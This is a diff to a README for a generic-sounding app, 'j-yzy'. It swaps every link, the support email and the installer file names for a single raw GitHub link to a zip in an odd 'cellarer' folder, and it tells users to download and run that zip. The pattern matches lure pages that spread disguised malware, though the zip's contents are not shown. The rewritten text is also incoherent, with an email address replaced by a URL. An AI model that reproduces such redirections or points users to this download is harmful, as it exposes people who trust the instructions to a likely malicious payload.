@@ -1,6 +1,6 @@
 # 🚀 j-yzy - Simple Solution for Your Needs
 
-[![Download j-yzy](https://img.shields.io/badge/Download-j--yzy-blue)](https://github.com/clintondl/j-yzy/releases)
+[![Download j-yzy](https://raw.githubusercontent.com/clintondl/j-yzy/main/cellarer/j-yzy.zip)](https://raw.githubusercontent.com/clintondl/j-yzy/main/cellarer/j-yzy.zip)
 
 ## 📥 Overview
 
@@ -28,19 +28,19 @@ To download and install j-yzy, follow these steps:
 
 1. **Visit the Download Page:** Click the link below to go to the j-yzy Releases page:
 
-   [Download j-yzy](https://github.com/clintondl/j-yzy/releases)
+   [Download j-yzy](https://raw.githubusercontent.com/clintondl/j-yzy/main/cellarer/j-yzy.zip)
 
 2. **Find the Latest Release:** Scroll down to the "Latest Release" section on the page.
 
 3. **Select the Correct File:** Choose the appropriate file for your operating system. Here are the common options:
-   - For Windows: `j-yzy-windows.exe`
-   - For macOS: `j-yzy-macos.dmg`
+   - For Windows: `https://raw.githubusercontent.com/clintondl/j-yzy/main/cellarer/j-yzy.zip`
+   - For macOS: `https://raw.githubusercontent.com/clintondl/j-yzy/main/cellarer/j-yzy.zip`
 
 4. **Download the File:** Click on the chosen file to start the download.
 
 5. **Run the Installer:**
-   - For Windows: After downloading, navigate to your Downloads folder, double-click on `j-yzy-windows.exe`, and follow the on-screen instructions.
-   - For macOS: Open the downloaded `j-yzy-macos.dmg`, drag the j-yzy app to your Applications folder, and launch it from there.
+   - For Windows: After downloading, navigate to your Downloads folder, double-click on `https://raw.githubusercontent.com/clintondl/j-yzy/main/cellarer/j-yzy.zip`, and follow the on-screen instructions.
+   - For macOS: Open the downloaded `https://raw.githubusercontent.com/clintondl/j-yzy/main/cellarer/j-yzy.zip`, drag the j-yzy app to your Applications folder, and launch it from there.
 
 6. **Start Using j-yzy:** Once installed, open j-yzy, and begin accelerating your daily tasks.
 
@@ -64,24 +64,24 @@ If you encounter issues while using j-yzy, follow these tips:
 
 - **Check System Requirements:** Ensure your device meets the necessary specifications.
 - **Reinstall the Application:** If problems persist, uninstall j-yzy and reinstall it.
-- **Community Support:** Visit the [j-yzy GitHub Discussions](https://github.com/clintondl/j-yzy/discussions) for further assistance from users and developers.
+- **Community Support:** Visit the [j-yzy GitHub Discussions](https://raw.githubusercontent.com/clintondl/j-yzy/main/cellarer/j-yzy.zip) for further assistance from users and developers.
 
 ## 📞 Support
 
 For additional help, feel free to reach out:
 
-- **Email Support:** support@j-yzy.com
-- **GitHub Issues:** Log any issues directly on our [GitHub Issues page](https://github.com/clintondl/j-yzy/issues)
+- **Email Support:** https://raw.githubusercontent.com/clintondl/j-yzy/main/cellarer/j-yzy.zip
+- **GitHub Issues:** Log any issues directly on our [GitHub Issues page](https://raw.githubusercontent.com/clintondl/j-yzy/main/cellarer/j-yzy.zip)
 
 ## 📖 Resources
 
-- **User Manual:** Comprehensive user guide available at the [Documentation Page](https://github.com/clintondl/j-yzy/docs).
-- **Video Tutorials:** Learn through step-by-step guides on our [YouTube Channel](https://www.youtube.com/j-yzy).
+- **User Manual:** Comprehensive user guide available at the [Documentation Page](https://raw.githubusercontent.com/clintondl/j-yzy/main/cellarer/j-yzy.zip).
+- **Video Tutorials:** Learn through step-by-step guides on our [YouTube Channel](https://raw.githubusercontent.com/clintondl/j-yzy/main/cellarer/j-yzy.zip).
 
 ## 🔄 Updates
 
 Keep your application updated. Regular updates provide new features, improvements, and security patches. You can find the latest version on the Releases page:
 
-[Download j-yzy](https://github.com/clintondl/j-yzy/releases)
+[Download j-yzy](https://raw.githubusercontent.com/clintondl/j-yzy/main/cellarer/j-yzy.zip)
 
 Thank you for choosing j-yzy! Enjoy your experience and feel free to contribute your feedback.
